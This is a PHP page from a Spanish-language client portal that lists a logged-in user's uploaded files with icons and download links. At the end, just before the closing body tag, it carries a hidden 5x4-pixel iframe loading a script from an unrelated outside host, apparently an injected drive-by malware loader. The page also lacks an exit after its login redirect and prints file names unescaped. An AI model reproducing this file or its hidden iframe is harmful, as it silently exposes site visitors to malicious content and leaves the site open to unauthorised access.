<?
	session_start();

	if (!session_is_registered("idUser")) {
		header("location: index.php");
	}

	include '../../classes/config.php';
	include '../../classes/clsSqlServer.php';
	include '../../classes/clsClientes.php';
	
	$SqlSrv		= new SqlServer();
	$ManCli		= new ManagerClientes();
	
	$SqlSrv->dbConnect();

	$Archivos = $ManCli->ListArchivos($_SESSION["idUser"]);
	$total_archivos = $SqlSrv->dbNumRows($Archivos);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<title>M S A</title>
<!-- STYLES -->
<link rel=stylesheet type="text/css" href="../css/clientes.css">
</HEAD>

<BODY background="../images/clientes/bgi.gif" topmargin="0" leftmargin="0">

<TABLE border="0" cellpadding="4" cellspacing="0" width="100%">
	<TR>
		<TD class="titulo">Listado de Archivos</TD>
	</TR>
</TABLE>
<table border="0" cellpadding="0" cellspacing="0" width="460">
<?
	if ($total_archivos>0){ 
		for ($i=0; $i<$total_archivos; $i++) {
			$row = mysql_fetch_array($Archivos);
							
			$id			= $row['id'];
			$nombre		= $row['nombre'];
			$archivo	= $row['img_chica'];

			$ext = substr($archivo, strpos($archivo, ".")+1, strlen($archivo) - strpos($archivo, "."));

			switch($ext){ 
				case 'xls':
				case 'doc':
				case 'pdf':
				case 'ppt':
					$icono = 'ico_'.$ext.'.gif'; 
				break;
				default:
					$icono = 'ico_def.gif'; 
			}
?>
	<tr>
		<td width="40" align="right"><img src="../images/clientes/<?=$icono?>" width="16" height="16" hspace="5"></td>
		<td width="420" class="arc_txt"><A HREF="<?="../upload/".$archivo?>" target="_blank"><?=$nombre?></A></td>
	</tr>
	<tr>
		<td width="40"></td>
		<td width="420"><div class="sep"><spacer type=block width=1 height=1></div></td>
	</tr>
<?
		}
	} else {
?>
	<tr>
		<td height="40" class="txt" align="center">No se encontraron archivos para descargar.</td>
	</tr>
<?
	}
?>
</table>


<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
